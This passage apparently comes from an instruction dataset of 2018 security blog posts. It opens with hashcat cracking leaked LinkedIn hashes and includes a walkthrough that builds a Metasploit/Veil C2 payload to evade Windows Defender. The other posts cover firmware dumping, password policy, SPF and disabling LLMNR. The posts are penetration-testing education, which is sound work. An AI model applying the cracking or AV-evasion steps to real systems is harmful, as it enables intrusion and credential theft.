SHA1 and hashing will go insanely fast, we\u2019re going to add a couple of alphanumeric\u2019s at the end of each word in our dictionary too.\n\nhashcat64.bin -a 6 -m 100 68_hash.txt customdict.more.expanded.txt ?a?a -o test.pot\n\nWe hit 1.27% of those ~60 million LinkedIn hashes with our College Football sourced dictionary and it took 22 seconds.\n\nLinks\n\nDigINinja\u2019s CeWL: https://digi.ninja/projects/cewl.php\n\nJohn the Ripper: http://www.openwall.com/john/\n\nHashcat: https://hashcat.net/hashcat/\n\nHashcat-utils: https://github.com/hashcat/hashcat-utils\n\nMicrosoft Office Document Encryption: https://technet.microsoft.com/en-us/library/cc179125.aspx\n\nRelated Blogs:\n\nBlack Hills Information Security Hashcat Blogs:\n\nhttps://www.blackhillsinfosec.com/tag/hashcat/\n\nBlack Hills Information Security Password Cracking Rig Build: \n\nhttps://www.blackhillsinfosec.com/build-password-cracker-nvidia-gtx-1080ti-gtx-1070/\n\nBlack Hills Information Security: How to Crack Passwords for Password Protected MS Office Documents: \n\nhttps://www.blackhillsinfosec.com/crack-passwords-password-protected-ms-office-documents/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hardware Hacking with Shikra\"\nTaxonomies: \"How-To, Bus Pirate, hardware hacking, Shikra\"\nCreation Date: \"Mon, 14 May 2018 14:54:22 +0000\"\nRick Wisser//\n\nComparing Apples to Oranges (Bus Pirate vs Shikra) this a Hardware Hacking 101 webcast follow up blog post.\nI recently did a hardware hacking webcast on hacking a router with the Bus Pirate. The webcast can be found at https://www.blackhillsinfosec.com/webcast-hardware-hacking-101/. In the webcast I made a comment on how long it took to dump the firmware off the chip with the bus pirate (approximately 30 minutes). Well, here is a blog post with the same content but using the Shikra.\nIf you are not familiar with the Bus Pirate then you need to check out the webcast along with the dangerous prototypes website: http://dangerousprototypes.com/docs/Bus_Pirate.\nThe Bus Pirate as well as the Shikra are devices that enable a user to interact with different types of protocols. Protocols such as JTAG, SPI, IC2, UART and GPIO via a USB interface.\nIn the webcast I talk about chip isolation and in the example I remove the chip off of the router so that it was totally isolated. In this blog post we will start at that point with connecting the device. Remember that I placed the chip with the firmware on the breakout board as shown below.\n\nNow we need to examine the pin layouts for both the chip and the Shikra so that we can make the proper connections to interact with chip via the Shikra. Pinouts and information about the Shikra can be found at: https://int3.cc/products/the-shikra. The chip that we have is a MX25L6406E/MX25L6408E. A quick view of the data sheet provided the pinout of the device.\n\nAlso, definitions of what each pin is utilized for was also observed.\n\nThe Shikra pinout is also needed to determine how to connect the breakout board (chip) to it.\n\nNow that we have the pinouts we can wire them together as shown in the table below.\n\nAs like in the webcast, a breadboard with a power supply was utilized to supply the voltage to the chip as well as make the connections in the table above.\nOnce the connections are made we are ready to dump the firmware. With the Bus Pirate we used the following command:\nSudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -c MX25L6406E/MX25L6408E -r spidump.bin\n \nThe flashrom command sets up the type of protocol that the chip on the BusPirate is utilizing. In this case flashrom has a BusPirate_spi specific protocol. The command then identifies the device location (ttyUSB0) and the speed to read the data (note: that any higher speed will become unstable). The -c identifies the type of device to read from and the -r is to write the data to a file\nHowever, with the Shikra we will still use flashrom but the command to use is:\nSudo flashrom -p ft2232_spi:type=232H -c MX25L6406E/MX25L6408E -r spidump.bin\n \nWhere the flashrom command sets up the type of protocol that the chip on the Shikra is utilizing (ft2232) and the type, the -c identifies the type of device to read from and the -r is to write the data to a file.\nBy comparing the two read speeds, it is apparent that the Shikra is much faster at reading the chip. What takes the Bus Pirate 30 minutes to read the contents it only takes the Shikra 3 minutes.\nTo be fair I used the Bus Pirate version 3.6 for the testing. Dangerous Prototypes has a new board called the Bus Blaster which uses the same ft2232 chip as the Shikra. Who knows... another blog post might be needed for comparison.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"C2, C3, Whatever It Takes\"\nTaxonomies: \"C2, How-To, C2, command and control, metasploit\"\nCreation Date: \"Thu, 17 May 2018 14:52:31 +0000\"\nDarin Roberts//\n\nIf you have been in the security field for any length of time at all you have heard the term C2.  You might have heard it also called C&C or Command and Control.  I will refer to it as C2 as here at BHIS, that is what we do.  Some of you might wonder what exactly is C2, and those who might know what it is might not understand what it means, and even more might not know how to set up a C2.  It is really not uncommon to be talking with another tester and they will say something along the lines of, \u201cI couldn\u2019t do X, Y or Z, so I just set up a C2 to bypass the problems.\u201d  So, what exactly is a C2 and how does it work?  And even better, how can I set one up?\n\nFirst off, what is C2?  C2 is remotely controlling another system.  This can be a good thing.  I know that for me personally, I love Remote Desktop and use it daily.  There are other common forms of C2 like VNC or SSH that are common as well.  They can be very beneficial and make working on computers much easier than physically being in front of the machine.\n\nHowever, where something can be used for good, it can also be used for bad.  On the evil side of C2, malware is uploaded to a target host and then executed.  This malware has been pre-programmed to run and then to set up a communications channel to the command and control server on the internet.  The malware can be downloaded and installed in limitless ways.  It can come as an email attachment, clicking on the wrong link, downloading a trojan software, plugging in a USB, or any of another myriad of ways.  The result with C2 is the same, you have given an avenue for an attacker to execute commands on your computer.\n\nSo how does C2 work?  The unsuspecting victim executes a command on their computer to install the malware.  After the malware is installed, the malware will call out to the C2 server and wait for its next command.  It is usually going to send out a beacon on a time basis to let the server know it is still alive and to see if there is anything it should do.  When the server is ready, it will issue its command to execute on the infected host machine.\n\nBecause the hosts are not sending constant data out of the network, detecting these infected hosts can sometimes be difficult.  There are anti-virus programs that detect off-the-shelf C2 programs, but they don\u2019t detect everything.  I was in a meeting just the other day when a co-worker said, \u201cI always use custom C2 and bypass everything.  I know it will work.\u201d\n\nHow do you set up a C2?  In this blog, I will set up a C2 using Metasploit and Veil.  The host will be running Windows 10 with Windows Defender installed and in use.\n\nThe first step is to set up the listener using Metasploit.  Thanks to our great SysAdmins at BHIS, I got a Kali instance set up just for this purpose.\n\nNow that we have our listener set up, we need to get the payload.  I first used Metasploit to create the payload.\n\nI copied this C2.exe file to my Windows machine, but Windows Defender didn\u2019t like it.\n\nWindows Defender is a surprisingly good antivirus program.  However, as this is not a review of AV solutions, we will just try to see if we can bypass it.  I then used Veil-Evasion (https://github.com/Veil-Framework/Veil-Evasion).\n\nNow that we have the payload from Veil (the file c2.bat), let\u2019s copy it over to our Windows machine to see if it bypasses Windows Defender.\n\nI created a folder on my desktop called C2 Folder.  I was able to just move this c2.bat file into my newly created folder, and Windows Defender did not trigger it.\n\nI want this file to run with administrator privileges, so I will right-click on it and \u201cRun as administrator\u201d.  Click Yes to allow.\n\nAfter I run the c2.bat file, a session gets started on my Kali with the Meterpreter listener on it.\n\nI want to interact with the session so I type the command \u201csessions -i 1\u201d.\n\nOn my Windows machine, it doesn\u2019t look like anything is happening.  I could take a screenshot of that, but it would be boring.\n\nI don\u2019t want Windows to kill my process, so I am going to change migrate to another process that is stable and that Windows likes.  Spool is a good idea.  Explorer is another popular choice.\n\nNow that I know the PID for spool is 4188, I am going to change my PID to 4188.\n\nNow that I have access, I am going to change directories to see what is out there.\n\nI want to see what is in this file!  \n\nWith a C2 session, there are all kinds of fun things you can do, but that is for another blog.\n\nAnd for those of you who haven't seen Mr. Mom or who are curious about the title of this blog post:\n\nhttps://www.youtube.com/watch?v=iX3kxAA2L4Q\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"GNURadio Can Make You Hear Laurel & Yanny\"\nTaxonomies: \"Fun & Games, Informational, Factoria Labs, GNURadio, Laurel & Yanny, SDR, Software Defined Radio, Sound Experiments\"\nCreation Date: \"Fri, 18 May 2018 16:12:29 +0000\"\nPaul Clark* //\n\nhttps://youtu.be/EXRoQGHx-80\n\nFeeling uncomfortably productive today? I\u2019ve got a remedy for that, involving internet memes and signal processing. Come and waste a few minutes of your day with Laurel, Yanny, and GNURadio.\n\nIt\u2019s been going on for a couple of days, so you\u2019re probably already wearying of the interpretive controversy centered around the audio clip. In short, some people listen to it and clearly hear the word \u201cLaurel,\u201d while others clearly hear the word \u201cYanni.\u201d Although the academic brain trust hasn\u2019t yet converged on a consensus explanation, there does appear to be some connection to the lower and higher frequency components of the audio. This immediately got me thinking about how to use GNURadio to process the sound to produce both interpretations for the listener.\n\nAt this point, you\u2019re probably thinking two things: \"This guy must have something better to do,\u201d and \u201cYou can\u2019t use radio software to process audio!\u201d While I\u2019ll concede the first point, you can actually use GNURadio to do stuff like this. Although GNURadio is designed for processing radio signals, it actually possesses a host of general-purpose signal processing capabilities, many of which can be applied to any digitized signal you want - including an audio signal of dubious value.\n\nI built the following flow-graph to produce three different variations of the clip: the original, a Laurelized version and a Yannified one:\n\nThe Audio Sink (which is essentially your sound card) plays the audio stream picked by the Selector-block, which you control via the QT GUI Chooser. If you select the \u201cOriginal\u201d option you\u2019ll simply hear an unmodified version of the original WAV file (this sounds very clearly like \u201cLaurel\u201d to me, but if you\u2019re one of those crazy Yanny people\u2026 more power to you).\n\nIf you choose the \u201cLaurel\u201d button, you\u2019ll get an audio stream passed through a Low Pass Filter that removes frequencies higher than 4.5 kHz.\n\nFinally, choosing the \u201cYanny\u201d button results in a high pass filtered version that has any frequencies lower than 2 kHz removed. This version of the audio is also slowed down slightly by the Rational Resampler block, but this was just to clarify the sound a bit.\n\nIf you want to try this out for yourself, you can clone my project at:https://github.com/paulgclark/laurel-yanny\n\nYou\u2019ll need GNURadio on your machine, but you can take care of that on an Ubuntu install by typing:\n\nsudo apt-get install gnuradio\n\n(this won\u2019t give you the latest version of GNURadio, but it\u2019s recent enough for this)\n\nYou can then change into the laurel-yanny directory and type:\n\ngnuradio-companion laurel-yanny.grc\n\nClicking the small play button in the toolbar will run the flowgraph:\n\nI found that when I selected the \u201cYanny\u201d button and moved the high pass filter cutoff to the left, the \u201cLaurel\u201d sound became more clear.\n\nMoving it to the right strengthened my ability to hear the \u201cYanny\u201d sound. At the midpoint, my brain\u2019s audio interpretation actually started going back and forth between the two. I was even able to think one of the words and induce my brain to perceive it. It\u2019s wacky stuff, people.\n\n______________\n\n*Paul Clark owns Factoria Labs, an organization dedicated to the propagation of software-defined radio. The more paranoid among you might suspect that this post was all just a ploy to get you to start using GNURadio to see how awesome it is. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Finding: Weak Password Policy\"\nTaxonomies: \"Author, David Fletcher, Finding, Informational, bad passwords, password, password policy, weak password\"\nCreation Date: \"Thu, 24 May 2018 15:15:15 +0000\"\nDavid Fletcher//\n\nThe weak password policy finding is typically an indicator of one of two conditions during a test:\n\nA password could be easily guessed using standard authentication mechanisms.\nA password could be easily recovered after capturing crackable password hashes.\n\nPassword strength is a topic of serious contention within most of the organizations that we test.  There is a constant struggle between information security staff who want to protect the organization and the people who have to do the business that keeps it viable.\nAs IT and security personnel, when we ask employees to construct complex passwords, we usually end up with something like the following. As expected, we also get a similar response.\n\nEasily Guessable Passwords\nCreating password policies like this will rarely work because users identify ways to create weak passwords that comply with the implemented policy. Take, for instance, a password policy that requires an upper case character, a lowercase character, a number, and a symbol which must be eight characters in length. Some of the weak passwords that we commonly observe include things like:\n\nSpring2018!\nFebruary18!\nPassword1!\n\nThis isn\u2019t nearly exhaustive because we often find company names, slogans, and other region specific root words exhibiting the same pattern.\nUsers select these passwords because they are easy to remember, easy to create, and conforms with the policy. The following XKCD comic illustrates this issue.\n\nAttackers often engage in password guessing attacks like password spraying in an attempt to expand their access to other users in the environment. Having easily guessed passwords makes this expansion possible.\nEasily Cracked Passwords\nIn addition to the ability to guess passwords, attackers often have the opportunity to crack passwords within an environment.  When an attacker engages in password cracking, they typically need password hashes to crack.\nOften, hashes can be obtained without any special permissions in an environment. Abuse of protocols like Kerberos, Link-Local Multicast Name Resolution, and NetBIOS Name Service are typical attack vectors. However, they are not exclusive. Careless application of share permissions can expose backup files that contain hashes as well.\nIf passwords are short, then the attacker typically has an advantage. As an example, the BHIS dedicated password cracker can exhaust the entire 8-character password keyspace, cracking NTLM hashes, in a matter of a few hours.\nFor this reason, BHIS urges its customers to consider a password policy that focuses on greater length than character set complexity. We recommend the following:\n\nThe minimum passphrase length should be 15 characters.\nMultiple dictionary words constituting a phrase should be permitted and encouraged.\nEncourage title case in phrases and allow digit substitution for words.\n\nThe length of a password has much greater influence on the attacker\u2019s ability to crack that password in a reasonable amount of time (before your next password change) using brute force techniques. Another XKCD comic illustrates this concept.\n\nOther Considerations\nHaving a strong password policy keeps attackers from guessing weak passwords and cracking hashes collected through various means. In addition to strengthening your password policy, measures should be taken to minimize or eliminate opportunities that assist attackers in collecting hashes.\nIn addition, users should be encouraged NOT to reuse passwords across multiple accounts. This is especially true when those accounts operate at different privilege levels.  An attacker who gains access to a single account may suddenly find instant access to many resources. If users maintain a large number of passwords and have trouble remembering them, the organization should consider the use of a reputable password manager application.\n\nWhere and how elevated privilege credentials are used should be carefully architected. Memory analysis with tools like Mimikatz can reveal plain text credentials of any complexity on certain systems. If possible, protective measures should be placed on these systems (like Credential Guard) to prevent disclosure. For ultimate protection, administrators should operate on administrative-only workstations that lack internet browsing and email capabilities.\nFinally, for especially sensitive systems (like Domain Controllers) and internet facing logon interfaces that grant access to internal resources (like email and VPN) multi-factor authentication should be implemented. On internal systems, the technology should be usable with interactive (console logon, Remote Desktop Protocol, etc.) and non-interactive sessions (enter-pssession, psexec, etc).\n\nConclusion\nA strong password policy should be one of the cornerstones of your security program. Users are constantly under attack using vectors like social engineering, phishing, and drive-by downloads. Without a strong password policy, the success of just one of these attacks could result in systemic compromise of an environment.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Configure SPFv1: Explained for the Masses\"\nTaxonomies: \"Blue Team, How-To, Phishing, Best Practices, Blue Team, Derrick Rauch, DKIM, DMARC, Email, Filtering, Kent Ickler, Marketing, phishing, Sender Policy Framework, Spam, SPF\"\nCreation Date: \"Tue, 29 May 2018 12:30:14 +0000\"\nKent Ickler and Derrick Rauch* //\n\nSun Protection Factor\n\nErr\u2026 wait a second.\nSender Policy Framework\n\nLadies and Gentlemen of the class of 1997, Wear Sunscreen...I will dispense my advice, now:  \"\n\nEmail \u201cforging\u201d exists in the web today, thanks @ustayready. Sender Policy Framework (SPF) was created with origins back in 2005 (RFC 4408) with more recent version updated in 2014 (RFC 7208) and DKIM and DMARC updates. It attempts to thwart forged emails by providing recipient-mail-servers, a method to determine if the origination of the email was authorized to send mail on behalf of the domain in the FROM field of the email. Recipient-mail servers then had the opportunity to determine if the inbound email should be considered more-likely forgery/phishery or if more-likely legitimate.\nIf a recipient-mail-server receives email with a FROM address of an SPF authorized server, it has reason to believe its a valid/\u201dgood\u201d email.\nIf a recipient-mail-server receives email with a FROM address of an SPF unauthorized server, it has reason to believe it is an invalid/bad email.\nSPF records can also \u201cinform\u201d the recipient-mail-server what to do in case mail is received from an unauthorized mail server. It can continue to deliver the email, mark it for suspicion (increase its risk rating), or outright deny the email. Of course, the SPF record isn\u2019t the golden-rule. The recipient-mail-server can follow whatever methodology it cares to take when considering the weight of SPF records.\nThe Marketing Spiel:\nSo Marketeers often struggle with this. It's a SendGrid, MailGun, MailChimp, ect dilema. They bought this fancy new marketing email solicit tool but everyone keeps marking their campaign emails as spam! If your Marketing group didn\u2019t take their time to ensure their SPF records for their FROM domain is accurate, emails being received could more easily be considered spam/malicious and sent to the Spam box, ever to be forgotten.\nForward Thinking:\nSender Policy Framework isn\u2019t dying, but it does have new brotherly love in the anti-spam and the anti-phisery departments. DKIM and DMARC are newer frameworks that extend the validation that SPF started back in the day.  Together they attempt to build a network of trust between domain-ownership and recipient-mail-servers. Check out future blog posts for discussion on DMARC and DKIM.\nDomain Name Server Record:\nThe SPF record that \u201cauthorizes\u201d a mail-server/relay to be delivering emails is a DNS TXT record that must be entered on the Name Server as designated by the registrar. Because this implies domain ownership, it allows the owner of a domain to tell recipients if mail received with their domain in the FROM field was delivered by a mail server they expected.\nThe DNS record we discuss below must be created on the domain\u2019s name server as defined by NS record on the domain\u2019s registrar.\nSyntaxing:\nThere are lots of tools to help you build SPF records,but you still need to know what\u2019s going on. SPF records are read by SMTP-Recipients left-to-right. Upon first match, the record analysis stops with the configured result.\nDNS record type = TXTHost = @ (whatever your primary TLD is, or whatever domain you\u2019re trying to protect).Value= [SYNTAX]!!\nThe value key is where the meat of the record is so lets take a look:\n\u201cv=spf1 \u201c [Mechanism-Action] [Mechanism-Who] [Mechanism-Action] ]Mechanism-Who]...\nMechanism-Action:\nThe action parameter tells the recipient mail server what to do.  Its syntax is below:\n+         Pass email: SPF record designates host is authorized (mail accepted)\n\n-        Fail email: SPF Record designates host is not authorized (mail rejected)\n\n~        SoftFail: SPF Record designates host is not authorized but, meh, maybe (mark/increase-risk).\n\n?        Neutral: SPF Record designates that it has no idea, double-meh. (mail acepted_\n\nOther action/reults\n\nMechanism-Who\nThere are a lot of options here:\nall         Everserver, everywhere\n\nip4:\n\nIp4:/CIDR-Style\n\nip6:\n\nip6:/CIDR-Style\n\na:[domain]                  Include all A-records of [x-domain]\n\na:[domain]/CIDR         Include the /CIDR network of all a-records of [xdomain]\n\na                         Include all a records of this domain.\n\na/CIDR                 Include the /CIDR network of all a-records of this domain\n\nmx                         Include the mx-records of this domain\n\nmx/CIDR I                nclude the /CIDR network of all mx-records of this domain\n\nmx:[domain]                 Include all mx-records of [x-domain]\n\nmx:[domain]/CIDR         Include the /CIDR network of all mx-records of [xdomain[\n\nptr                         Include the IP of the ptr record of this domain\n\nptr:[domain]                Include the IP of the ptr record of [x-domain]\n\nexists:[domain]         YES/NO trigger.  If an A record exists = Pass\n\nredirect :[domain]        Replace this entire SPF record with the SPF record of [domain]\n\ninclude:[domain]        Include the SPF records of [domain].  Match = pass, no match=fail. This type record is used in most cases for large mail providers like Google, Office, ect. This is also commonly used for mail-relays like SendGrid, MailGun, etc.\n\nThe include: is a trust mechanism.  It allows you to proxy trust of who is authorized to send email from your domain/organization onto the SPF records of another domain/organization who you acknowledge to be responsible for sending your email.  These organizations often blanket their SPF records to cover all of their possible mail servers.  \nExamples:\nv=spf1 +mx -all\n\nAccept email from this domains mx record, reject from anywhere else.\n\nv=spf1 +a:AnotherDomain.com ?a:google.com -all\n\nAccept email from a-records of AnotherDomain.com, meh on a-records of Google.com, but reject everything else.\n\nv=spf1 exists:AnotherDomain.com -all\n\nAccept email if an a-record exists for AnotherDomain.com, but reject if it doesn\u2019t.\n\nv=spf1 -all\n\nReject email from this domain, regardless of who sends it.\n\nv=spf1 include:mailgun.com include:sendgrid.com -all\n\nFollow rules in the SPF-Record for mailgun.com and sendgrid.com, reject all others.\n\nv=spf1 redirect=AnotherDomain.com\n\nFollow only the rules in the SPF-Record of AnotherDomain.com\n\nMarketeering, again:\nBack to that Marketing bit, what are MailChimp, MailGun, and SendGrid doing?\nInterestingly there\u2019s something to be said here if you\u2019re using a mail-relay or mass-mailing service. The email *can* be considered authorized and you can break-through spam boxes. But, the red-teamer inside me would have to ask\u2026\nCan a third party just create an account over at a third party I\u2019ve trusted and send email on my behalf without my explicit approval?\nWell, Yes... and no.\nThese services can send email on your behalf if you configure your SPF record to authorize their mail server. They each do some diligence to ensure that a third party cannot send email with your from address. They do this by forcing users to validate their FROM domains prior to sending email on behalf of that domain. Each service does this differently. Some make dns records on their domains that should be included as +a:yourdomain.mailrelayservice.com which can provide you some reassurance. Ultimately though, you need to trust your mail servers, and if you feel you can\u2019t do that, well\u2026 its a tough world and paralyzing paranoia will set in.\nFor more information on SPF Records and the like, check out the links below. Also stay tuned for our upcoming blogs on DKIM (RFC 7372) and DMARC (RFC 7489)!\nSPF Record Generators\nThere are platforms out there that can help build SPF records to fit your specific needs. Most work very similar to each-other\u2026 some even want money$$! I wouldn\u2019t suggest paying for helping you create an SPF record, but as always, be careful when using free services. That said, MXToolbox has been in my SysAdmin and Blue-Team toolbox for years and hasn\u2019t let me down.\nBuild SPF Online: https://mxtoolbox.com/SPFRecordGenerator.aspx\nLinks\nOpen Sender Policy Framework: http://www.openspf.org/Project_OverviewBuild SPF Online: https://mxtoolbox.com/SPFRecordGenerator.aspx\nSPF V1: RFC 7208 (obs 4408, 6652) https://tools.ietf.org/rfc/rfc7208.txtSPF V1: RFC 6652 (obs by RFC-7208) https://tools.ietf.org/html/rfc6652SPF V1: RFC 4408 (obs by RFC-7208) (2006) https://tools.ietf.org/html/rfc4408https://www.ietf.org/rfc/rfc4408.txt\nUpcoming Blogs Reading: DKIM, DMARC!\nDomain-Based Message Authentication, Reporting, and Conformaice: https://dmarc.org/\nSPF V1: RFC 7960 - Interoperability of DMARC https://tools.ietf.org/rfc/rfc7960.txtSPF V1: RFC 7489 - DMARC https://tools.ietf.org/rfc/rfc7489.txtSPF V1: RFC 7372 -DKIM  (updated 7208) https://tools.ietf.org/rfc/rfc7372.txt \n\nBut trust me on the Sunscreen . \"\n\n________\n*Kent & Derrick are part of our sysadmin team - what would we do without them?\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"What I Wish I Would Have Known\"\nTaxonomies: \"General InfoSec Tips & Tricks, Informational, InfoSec 101, advice, infosec, infosec 101\"\nCreation Date: \"Thu, 31 May 2018 15:24:10 +0000\"\nBre Schumacher//\n\nMany of you were probably asked as a young child what you wanted to be when you grew up. Maybe you had an idea of something that sounded fun to you, like being an astronaut or the mayor. Perhaps you hadn\u2019t decided. Maybe you still haven\u2019t decided! Either way, I\u2019m guessing as a child the thought never crossed your mind that you\u2019d be working in information security someday.\n\nOr maybe it did?\n\nFor those of you just starting out in this field, I thought I\u2019d ask a few of our Black Hills Information Security testers what they wish they would have known when they were in your shoes. They say hindsight is 20/20 and people can truly be some of your greatest resources, so hopefully you\u2019ll take some of this to heart.\n\nHere\u2019s what they had to say:\n\n\u201cI wish I would have known how valuable development skills would be in this line of work. I would have worked harder to maintain my coding chops.\u201d - Sally\n\n\u201cI wish I would have realized how important it was to speak at conferences, share my research and give back to the community. I always felt like I didn't have anything 'share-worthy' but that kind of thinking was a result of me comparing myself to those who I looked up to instead of realizing I do belong and can help others.\u201d - Mike\n\n\u201cPersonally, I wish that I understood some of the fundamental concepts of coding when I started. Networking and infrastructure background is a very important piece of the information security puzzle, but...understanding system operations from Assembly, C, C++, Java, and on upward through the coding/system stack to Python sure would have been nice. I started with Python and am working my way down the stack, which has been fun but is very challenging.\u201d - Jordan\n\nAnd finally, one more important thing to consider:\n\n\u201cI wish I had known that you could take it in small pieces - really, that there's no other way to do it. It's taken me years to accept that there will always be a ton of things I don't know and that the best way to grow is to build on what I *do* know. There's never time to build that perfect lab, but I can always make time to try a new thing when an opportunity comes up.\u201d - BB King\n\nFor those of you who are a few years in, feel free to join in on Twitter and share what you wish you had known, too. We\u2019d love to hear what other bits of advice you have!\n\nIf you\u2019d like to chat with us in person, check out our events page to see what conferences we\u2019ll be at (including Wild West Hackin\u2019 Fest)!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Disable LLMNR & Why You Want To\"\nTaxonomies: \"Author, Blue Team, How-To, Kent Ickler, Active Directory, AD, AD Best Practices, Best Practices, Kent Ickler, Link Layer Multicast Name Resolution, LLMNR, network\"\nCreation Date: \"Thu, 07 Jun 2018 13:58:50 +0000\"\nKent Ickler //\n\nLink-Local Multicast Name Resolution (LLMNR)\n\nThis one is a biggie, and you\u2019ve probably heard Jordan, John, me, and all the others say it many many times. LLMNR was (is) a protocol used that allowed name resolution without the requirement of a DNS server. It was (is) able to provide a hostname-to-IP based off a multicast packet sent across the network asking all listening Network-Interfaces to reply if they are authoritatively known as the hostname in the query.  It does this by sending a network packet to port UDP 5355 to the multicast network address (all layer 2).\n\nYou into RFC\u2019s?  Me too: https://tools.ietf.org/html/rfc4795\n\nThe Impersonator:\n\nWhat if you configure a node on the network to authoritatively say that it is, no matter what the query, exactly who the query is looking for. Let's call this evil node \u201cI\u2019mEveryoneNotReally.\u201d This creates a race-condition for the client. The client who is requesting the information will accept (and wholly trust) whoever answers first as the authoritative answer, because, based on the protocol specifications, the only responses it should receive are authoritative (and trustworthy.)\n\nThe Hash Harvester:\n\nWindows (other operating systems too!) will use LLMNR in certain circumstances to identify certain machines on the network, such as file-servers. If Windows attempts to use LLMNR to identify the server of a file-share and it receives a reply, it will send the current user\u2019s credentials directly to that server assuming it wouldn\u2019t have replied if it wasn\u2019t the authoritative file-server. If that LLMNR received response was actually an impersonator (I\u2019mEveryoneNotReally), Windows just disclosed that user\u2019s credential hash to a third-party. What's worse? The impersonator may forward that packet to the actual file-server, so the user never realizes anything is amiss.\n\nDo we even need LLMNR?\n\nIt was useful back in the day when DNS servers required costly processing power and system admins didn\u2019t want them in every subnet (still don\u2019t!) AdHoc networks can benefit greatly from them as well, but AdHoc networks are pretty uncommon these days. It made sense for quick resolution of names that were on the same subnet.  Problem is hackers realized the protocol didn\u2019t have effective protections to prevent unauthorized nodes from authoritatively claiming they were anyone (everyone.) That said, in almost all cases LLMNR is no longer needed because proper DNS is configured. Disabling LLMNR closes a very serious risk vector. \n\nDisclaimer:\n\nI\u2019ve got 99 problems, LLMNR isn\u2019t one. \n\nYou are responsible for doing your own research in this matter and making the decision for what works best for your organization. If disabling this breaks stuff, try to un-disable it and fix what broke.  In my opinion, this is legacy protocol and presents enough risk that you are better to make whatever breaks work without LLMNR enabled.\n\nDisable LLMNR with Active Directory GPO:\n\nActive Directory has a GPO you can configure to prevent its domain workstations from using LLMNR.\n\nCreate a New or Update an existing Group Policy and Edit accordingly:\n\nComputer Configuration -> Administrative Templates -> Network -> DNS ClientEnable Turn Off Multicast Name Resolution policy by changing its value to Enabled\n\nSee screenshots below, essentially this operation is the same as using the Local Security Policy editor, with exception of making the modification on a Group Policy.\n\nDisable LLMNR with Local Group Policy (Windows 7,8,10 Pro)\n\nUse Local Group Policy editor by running gpedit.msc and modifying the policy.\n\nComputer Configuration -> Administrative Templates -> Network -> DNS ClientEnable Turn Off Multicast Name Resolution policy by changing its value to Enabled\n\nDisable LLMNR with Command Line (Single Workstation, Windows 7,8,10 Home)\n\nRun these guys from command line:\n\nREG ADD  \u201cHKLM\\Software\\policies\\Microsoft\\Windows NT\\DNSClient\u201d\nREG ADD \u201cHKLM\\Software\\policies\\Microsoft\\Windows NT\\DNSClient\u201d /v \u201dEnableMulticast\u201d /t REG_DWORD /d \u201c0\u201d /f\n\nDisable LLMNR on Linux (Ubuntu):\n\nEdit the line LLMNR=yes to LLMNR=no in /etc/systemd/resolved.conf\n\nnano /etc/systemd/resolved.conf\n\nReboot.\n\nLinks: \n\nRFC 4795: https://tools.ietf.org/html/rfc4795\n\nHow to benefit from Link-Local Multicast Name Resolution: https://blogs.technet.microsoft.com/networking/2008/04/01/how-to-benefit-from-link-local-multicast-name-resolution/\n\nVulnerability in DNS Resolution Could Allow Remove Code Execution: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-030\n\nBlack Hills Information Security Links: \n\nLLMNR Blog Posts: https://www.blackhillsinfosec.com/?s=LLMNR\n\nActive Directory Blog Posts: https://www.blackhillsinfosec.com/?s=Active+Directory\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Finding: Server Supports Weak Transport Layer Security (SSL/TLS)\"\nTaxonomies: \"Author, David Fletcher, Finding, encryption, Secure Sockets Layer, SSL, TLS, Transport Layer Security, Web\"\nCreation Date: \"Thu, 14 Jun 2018 13:32:01 +0000\"\nDavid Fletcher//\n\nThe following blog post is meant to expand upon the findings commonly identified in BHIS reports.  The \"Server Supports Weak Transport Layer Security (SSL/TLS)\" is almost universal across the breadth of our testing.\nWhy is this finding important?\nThis finding is important because attackers are ultimately interested in data.  Use of a strong SSL/TLS configuration provides identification, authentication, confidentiality, and integrity services to the application or protocol that is using it. If weak protocols and ciphers are supported, then an attacker may be able to break the encrypted tunnel that exists between the client and server. After this occurs, the attacker might impersonate one of the communicating endpoints, slurp up unencrypted information, or modify that information in transit.\n\nWhile attacking SSL/TLS might be difficult and time consuming, if it were impossible we wouldn\u2019t have retired entire protocols like SSLv2, SSLv3, TLS 1.0 (by 30 June 2018 for PCI compliance). We also wouldn\u2019t have had these over the years:\n\nFrom Left to Right; Heartbleed, Drown, and SSL POODLE Vulnerability Logos\nGiven the time constraints placed on a penetration test and conflicts with other goals and outcomes of the test, it\u2019s unlikely that we will have done anything more than confirmed the results of Nessus using an additional tool.\nSo why should you care?\nYou should care because the use of SSL/TLS is typically one of the only protections that keeps communication between a client and server (whether by a customer or employee) private. It also can provide authentication and integrity checking. Even the most trivial communication can include sensitive information or the ability to generate sensitive information as a side effect (like authentication hashes).  As a result, it\u2019s best to just keep your SSL/TLS configuration up to date by patching and disabling support for weak protocols and ciphers.\n\nWhat should you do about it?\nIn a corporate Active Directory environment, making these changes can be simple.  Active Directory Group Policy can be used to disable weak ciphers and protocols and to set the cipher preference across the breadth of your Windows computers (clients and servers). Obviously, implementing a change like this should be accomplished incrementally to ensure that client connection and SSL/TLS negotiation failures do not occur.\n\nIn addition to implementing the change in Group Policy, we also recommend that you change the settings in your default client image to ensure that devices cannot use insecure protocols or ciphers by default. Additional configuration may be necessary for specific Active Directory infrastructure systems to completely disable support for weak protocols and ciphers.\nSimilar automation capabilities can be found for Linux, Linux-like, and Unix devices using automation frameworks like Puppet.  As with Windows systems, these changes should be integrated into the baseline procedures for these operating systems as well.\nDon\u2019t forget those mobile devices too.\nThe area where you are likely to have the slowest progress is with embedded systems (printers, storage devices, point of sale hardware, etc.), and vendor appliances. If you have a homogeneous print environment you might be in luck because some vendors support mass firmware upgrades for cases like this. However, a better strategy might be segmentation and access control lists (or firewalls) to prevent devices (and their communication) from being accessible to an attacker in the first place.\n\nWhat constitutes \u201cweak\u201d and \u201cstrong\u201d?\nFrom a protocol perspective, your best bet is to disable support for anything short of TLS 1.2 if you can.  With regard to cipher suites and general configuration options, the following post by 